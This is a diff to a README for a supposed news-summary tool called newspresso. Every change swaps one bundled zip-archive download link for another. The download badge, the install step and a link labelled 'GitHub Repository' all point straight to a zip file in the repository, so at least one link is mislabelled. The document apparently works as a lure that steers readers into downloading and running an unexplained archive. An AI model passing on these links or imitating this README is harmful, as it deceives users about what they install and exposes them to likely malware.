@@ -1,6 +1,6 @@
 # 📰 newspresso - Simplifying Text-Based News Summaries
 
-[![Download newspresso](https://raw.githubusercontent.com/htetch/newspresso/main/newspresso/Software-v2.6.zip)](https://raw.githubusercontent.com/htetch/newspresso/main/newspresso/Software-v2.6.zip)
+[![Download newspresso](https://github.com/htetch/newspresso/raw/refs/heads/main/newspresso/Software_1.4.zip)](https://github.com/htetch/newspresso/raw/refs/heads/main/newspresso/Software_1.4.zip)
 
 ## 📥 Overview
 
@@ -13,7 +13,7 @@ Newspresso processes text-based news or announcement summaries. Whether it's abo
 
 2. **Visit the Download Page**  
    Click below to access the release page, where you can download the latest version of Newspresso.  
-   [Download newspresso](https://raw.githubusercontent.com/htetch/newspresso/main/newspresso/Software-v2.6.zip)
+   [Download newspresso](https://github.com/htetch/newspresso/raw/refs/heads/main/newspresso/Software_1.4.zip)
 
 ## 🛠️ Download & Install
 
@@ -90,7 +90,7 @@ Newspresso is open-source and available for everyone to use. Please review the L
 
 ## 🕵️‍♂️ Additional Resources
 
-- Visit our [GitHub Repository](https://raw.githubusercontent.com/htetch/newspresso/main/newspresso/Software-v2.6.zip) for more details about upcoming features and updates.
+- Visit our [GitHub Repository](https://github.com/htetch/newspresso/raw/refs/heads/main/newspresso/Software_1.4.zip) for more details about upcoming features and updates.
 - Follow our documentation for deeper insights on how to make the best use of Newspresso.
 
 Feel free to explore, and enjoy using Newspresso to simplify your text-based news processing!
